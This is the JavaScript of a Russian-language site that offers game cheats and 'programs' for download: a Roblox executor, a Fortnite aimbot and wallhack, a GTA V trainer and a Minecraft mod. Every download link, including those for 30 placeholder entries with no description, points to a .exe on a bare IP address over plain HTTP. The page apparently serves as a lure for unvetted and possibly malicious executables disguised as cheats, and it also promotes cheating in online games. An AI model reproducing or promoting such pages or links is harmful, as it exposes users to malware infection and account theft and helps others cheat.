function showSection(sectionId) {
    // Скрываем все секции
    document.querySelectorAll('.section').forEach(section => {
        section.classList.remove('active');
    });
    
    // Показываем выбранную секцию
    document.getElementById(sectionId).classList.add('active');
    
    // Обновляем активные кнопки навигации
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
}

// Полные описания программ
const descriptions = {
    'xeno-desc': `
        <img src="1.jpg" alt="Xeno Executor" class="modal-image">
        <h2>Xeno Executor</h2>
        <p><strong>Описание:</strong> Мощный инструмент для создания и запуска скриптов в Roblox. Поддерживает Lua скрипты и предоставляет расширенные возможности для модификации игрового процесса.</p>
        <p><strong>Возможности:</strong></p>
        <ul>
            <li>Запуск пользовательских скриптов</li>
            <li>Встроенная библиотека функций</li>
            <li>Поддержка Lua 5.1</li>
            <li>Безопасное исполнение</li>
            <li>Авто-обновления</li>
            <li>Поддержка всех версий Roblox</li>
        </ul>
        <p><strong>Системные требования:</strong> Windows 10/11, .NET Framework 4.8, 2GB RAM</p>
        <a href="http://194.79.46.110:1080/mrx/xeno.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `,
    'fortnite-desc': `
        <img src="2.jpg" alt="Fortnite Hack" class="modal-image">
        <h2>Fortnite Hack</h2>
        <p><strong>Описание:</strong> Комплекс читов для Fortnite включающий AIM, ESP и другие полезные функции для улучшения игрового опыта.</p>
        <p><strong>Возможности:</strong></p>
        <ul>
            <li>AIM Bot с настройкой</li>
            <li>Wallhack (ESP)</li>
            <li>No Recoil</li>
            <li>Speed Hack</li>
        </ul>
        <a href="http://194.79.46.110:1080/mrx/fortnite.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `,
    'gtav-desc': `
        <img src="3.jpg" alt="GTA V Trainer" class="modal-image">
        <h2>GTA V Trainer</h2>
        <p><strong>Описание:</strong> Полнофункциональный трейнер для Grand Theft Auto V с множеством опций для изменения игрового процесса.</p>
        <p><strong>Возможности:</strong></p>
        <ul>
            <li>Бесконечные деньги</li>
            <li>Бессмертие</li>
            <li>Изменение характеристик</li>
            <li>Телепортация</li>
        </ul>
        <a href="http://194.79.46.110:1080/mrx/gtav.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `,
    'minecraft-desc': `
        <img src="4.jpg" alt="Minecraft Mod" class="modal-image">
        <h2>Minecraft Mod</h2>
        <p><strong>Описание:</strong> Коллекция модов для Minecraft добавляющая новые возможности и улучшающая игровой процесс.</p>
        <p><strong>Возможности:</strong></p>
        <ul>
            <li>Новые блоки и предметы</li>
            <li>Улучшенная графика</li>
            <li>Оптимизация производительности</li>
            <li>Моды для выживания</li>
        </ul>
        <a href="http://194.79.46.110:1080/mrx/minecraft.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
    `
};

// Для остальных карточек добавим заглушки
for (let i = 1; i <= 30; i++) {
    const descId = `desc-${i}`;
    if (!descriptions[descId]) {
        descriptions[descId] = `
            <img src="${(i % 4) + 1}.jpg" alt="Программа ${i}" class="modal-image">
            <h2>Программа ${i}</h2>
            <p><strong>Описание:</strong> Подробное описание скоро будет добавлено.</p>
            <p>Мы работаем над наполнением контента для этого раздела.</p>
            <a href="http://194.79.46.110:1080/mrx/file${i}.exe" class="download-btn modal-download-btn">СКАЧАТЬ</a>
        `;
    }
}

function showDescription(descId) {
    document.getElementById('modal-body').innerHTML = descriptions[descId] || descriptions['desc-1'];
    document.getElementById('description-modal').style.display = 'block';
}

function closeDescription() {
    document.getElementById('description-modal').style.display = 'none';
}

window.onclick = function(event) {
    const modal = document.getElementById('description-modal');
    if (event.target == modal) {
        closeDescription();
    }
}

// Инициализация
document.addEventListener('DOMContentLoaded', function() {
    showSection('cheats');
});
